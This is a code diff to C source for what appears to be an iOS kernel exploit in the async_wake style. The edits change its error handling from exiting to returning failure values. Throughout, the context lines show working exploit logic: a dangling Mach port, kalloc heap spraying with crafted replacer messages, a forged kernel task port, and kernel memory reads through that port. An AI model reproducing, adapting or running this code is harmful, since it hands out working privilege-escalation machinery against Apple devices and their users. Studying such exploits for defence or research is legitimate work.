@@ -145,22 +145,23 @@ void make_dangling(mach_port_t port) {
   LOG("%x\n", err);
 }
 
-static void prepare_user_client() {
+static bool prepare_user_client() {
   kern_return_t err;
   io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
   
   if (service == IO_OBJECT_NULL){
     LOG("unable to find service\n");
-    exit(EXIT_FAILURE);
+    return false;
   }
   
   err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
   if (err != KERN_SUCCESS){
     LOG("unable to get user client connection\n");
-    exit(EXIT_FAILURE);
+    return false;
   }
   
   LOG("got user client: 0x%x\n", user_client);
+  return true;
 }
 
 mach_port_t* prepare_ports(int n_ports) {
@@ -169,8 +170,11 @@ mach_port_t* prepare_ports(int n_ports) {
     kern_return_t err;
     err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
     if (err != KERN_SUCCESS) {
-      LOG("failed to allocate port\n");
-      exit(EXIT_FAILURE);
+      for (int j=0; j<i; j++) {
+        mach_port_deallocate(mach_task_self(), ports[j]);
+      }
+      free(ports);
+      return NULL;
     }
   }
   return ports;
@@ -199,7 +203,7 @@ mach_port_t send_kalloc_message(uint8_t* replacer_message_body, uint32_t replace
   err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
   if (err != KERN_SUCCESS) {
     LOG("failed to allocate port\n");
-    exit(EXIT_FAILURE);
+    return MACH_PORT_NULL;
   }
   
   mach_port_limits_t limits = {0};
@@ -211,7 +215,7 @@ mach_port_t send_kalloc_message(uint8_t* replacer_message_body, uint32_t replace
                                  MACH_PORT_LIMITS_INFO_COUNT);
   if (err != KERN_SUCCESS) {
     LOG("failed to increase queue limit\n");
-    exit(EXIT_FAILURE);
+    return MACH_PORT_NULL;
   }
   
   
@@ -237,7 +241,7 @@ mach_port_t send_kalloc_message(uint8_t* replacer_message_body, uint32_t replace
     
     if (err != KERN_SUCCESS) {
       LOG("failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
-      exit(EXIT_FAILURE);
+      return MACH_PORT_NULL;
     }
   }
   
@@ -323,8 +327,7 @@ uint8_t* build_message_payload(uint64_t dangling_port_address, uint32_t message_
 
   if (fake_port + fake_task_offset < body) {
     LOG("the maths is wrong somewhere, fake task doesn't fit in message\n");
-    sleep(10);
-    exit(EXIT_FAILURE);
+    return NULL;
   }
 
   uint8_t* fake_task = fake_port + fake_task_offset;
@@ -414,8 +417,7 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
   err = mach_vm_read(tfp0, vm_map, 0x40, &data_out, &out_size);
   if (err != KERN_SUCCESS) {
     LOG("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
-    sleep(3);
-    exit(EXIT_FAILURE);
+    return MACH_PORT_NULL;
   }
 
   LOG("kernel read via second tfp0 port worked?\n");
@@ -447,8 +449,7 @@ uint64_t find_kernel_vm_map(uint64_t task_self_addr) {
   }
   
   LOG("unable to find kernel task...\n");
-  sleep(10);
-  exit(EXIT_FAILURE);
+  return 0;
 }
 
 const uint64_t context_magic   = 0x1214161800000000; // a random constant
@@ -466,18 +467,22 @@ mach_port_t get_kernel_memory_rw() {
   
   LOG("message size for kalloc.4096: %d\n", message_size_for_kalloc_size(4096));
   
-  prepare_user_client();
+  if (!prepare_user_client()) {
+    return MACH_PORT_NULL;
+  }
   
   uint64_t task_self = task_self_addr();
   if (task_self == 0) {
     LOG("unable to disclose address of our task port\n");
-    sleep(10);
-    exit(EXIT_FAILURE);
+    return MACH_PORT_NULL;
   }
   LOG("our task port is at 0x%llx\n", task_self);
   
   int n_pre_ports = 100000; //8000
   mach_port_t* pre_ports = prepare_ports(n_pre_ports);
+  if (pre_ports == NULL) {
+    return MACH_PORT_NULL;
+  }
   
   // make a bunch of smaller allocations in a different zone which can be collected later:
   uint32_t smaller_body_size = message_size_for_kalloc_size(1024) - sizeof(mach_msg_header_t);
@@ -489,6 +494,9 @@ mach_port_t get_kernel_memory_rw() {
   mach_port_t smaller_ports[n_smaller_ports];
   for (int i = 0; i < n_smaller_ports; i++) {
     smaller_ports[i] = send_kalloc_message(smaller_body, smaller_body_size);
+    if (smaller_ports[i] == MACH_PORT_NULL) {
+      return MACH_PORT_NULL;
+    }
   }
   
   // now find a suitable port
@@ -521,12 +529,15 @@ mach_port_t get_kernel_memory_rw() {
   
   if (first_port == MACH_PORT_NULL) {
     LOG("unable to find a candidate port with a suitable page offset\n");
-    exit(EXIT_FAILURE);
+      return MACH_PORT_NULL;
   }
 
   
   uint64_t* context_ptr = NULL;
   uint8_t* replacer_message_body = build_message_payload(first_port_address, replacer_body_size, message_body_offset, 0, 0, &context_ptr);
+  if (replacer_message_body == NULL) {
+    return MACH_PORT_NULL;
+  }
   LOG("replacer_body_size: 0x%x\n", replacer_body_size);
   LOG("message_body_offset: 0x%x\n", message_body_offset);
   
@@ -550,7 +561,10 @@ mach_port_t get_kernel_memory_rw() {
     uint64_t context_val = (context_magic)|i;
     *context_ptr = context_val;
     replacer_ports[i] = send_kalloc_message(replacer_message_body, replacer_body_size);
-    
+    if (replacer_ports[i] == MACH_PORT_NULL) {
+      return MACH_PORT_NULL;
+    }
+
     // we want the GC to actually finish, so go slow...
     pthread_yield_np();
     usleep(10000);
@@ -563,14 +577,12 @@ mach_port_t get_kernel_memory_rw() {
   err = mach_port_get_context(mach_task_self(), first_port, &replacer_port_number);
   if (err != KERN_SUCCESS) {
     LOG("unable to get context: %d %s\n", err, mach_error_string(err));
-    sleep(3);
-    exit(EXIT_FAILURE);
+    return MACH_PORT_NULL;
   }
   replacer_port_number &= 0xffffffff;
   if (replacer_port_number >= (uint64_t)replacer_ports_limit) {
     LOG("suspicious context value, something's wrong %lx\n", replacer_port_number);
-    sleep(3);
-    exit(EXIT_FAILURE);
+    return MACH_PORT_NULL;
   }
   
   LOG("got replaced with replacer port %ld\n", replacer_port_number);
@@ -578,6 +590,9 @@ mach_port_t get_kernel_memory_rw() {
   prepare_rk_via_kmem_read_port(first_port);
   
   uint64_t kernel_vm_map = find_kernel_vm_map(task_self);
+  if (kernel_vm_map == 0) {
+    return MACH_PORT_NULL;
+  }
   LOG("found kernel vm_map: 0x%llx\n", kernel_vm_map);
   
   
@@ -586,7 +601,10 @@ mach_port_t get_kernel_memory_rw() {
   // of ipc_space_kernel which means we can't fake a port owned by the kernel
   free(replacer_message_body);
   replacer_message_body = build_message_payload(first_port_address, replacer_body_size, message_body_offset, kernel_vm_map, ipc_space_kernel(), &context_ptr);
-  
+  if (replacer_message_body == NULL) {
+    return MACH_PORT_NULL;
+  }
+
   // free the first replacer
   mach_port_t replacer_port = replacer_ports[replacer_port_number];
   replacer_ports[replacer_port_number] = MACH_PORT_NULL;
@@ -598,6 +616,9 @@ mach_port_t get_kernel_memory_rw() {
   for (int i = 0; i < n_second_replacer_ports; i++) {
     *context_ptr = i;
     second_replacer_ports[i] = send_kalloc_message(replacer_message_body, replacer_body_size);
+    if (second_replacer_ports[i] == MACH_PORT_NULL) {
+      return MACH_PORT_NULL;
+    }
   }
   
   // hopefully that worked the second time too!
@@ -607,15 +628,13 @@ mach_port_t get_kernel_memory_rw() {
   err = mach_port_get_context(mach_task_self(), first_port, &replacer_port_number);
   if (err != KERN_SUCCESS) {
     LOG("unable to get context: %d %s\n", err, mach_error_string(err));
-    sleep(3);
-    exit(EXIT_FAILURE);
+    return MACH_PORT_NULL;
   }
   
   replacer_port_number &= 0xffffffff;
   if (replacer_port_number >= (uint64_t)n_second_replacer_ports) {
     LOG("suspicious context value, something's wrong %lx\n", replacer_port_number);
-    sleep(3);
-    exit(EXIT_FAILURE);
+    return MACH_PORT_NULL;
   }
   
   LOG("second time got replaced with replacer port %ld\n", replacer_port_number);
@@ -639,8 +658,7 @@ mach_port_t get_kernel_memory_rw() {
   err = mach_vm_read(first_port, kernel_vm_map, 0x40, &data_out, &out_size);
   if (err != KERN_SUCCESS) {
     LOG("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
-    sleep(3);
-    exit(EXIT_FAILURE);
+    return MACH_PORT_NULL;
   }
   
   LOG("kernel read via fake kernel task port worked?\n");
@@ -686,8 +704,8 @@ mach_port_t get_kernel_memory_rw() {
 }
 
 
-void async_wake_go() {
+bool async_wake_go() {
   mach_port_t tfp0 = get_kernel_memory_rw();
   LOG("tfp0: %x\n", tfp0);
-  return;
+  return (tfp0 != MACH_PORT_NULL);
 }
